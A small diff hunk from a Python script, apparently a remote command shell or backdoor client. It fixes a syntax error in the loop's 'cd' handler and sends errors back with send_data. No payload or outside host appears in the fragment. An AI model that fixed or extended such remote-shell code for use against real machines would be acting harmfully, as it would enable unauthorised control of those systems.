@@ -79,7 +79,7 @@ while True:
 	elif cmd[:2] == "cd":
 		# Handle Change Directory (cd) Exception
 		try:
-			os.chdir.(cmd[3:])
+			os.chdir(cmd[3:])
 		except FileNotFoundError:
 			send_data(b"File not found")
 		else:
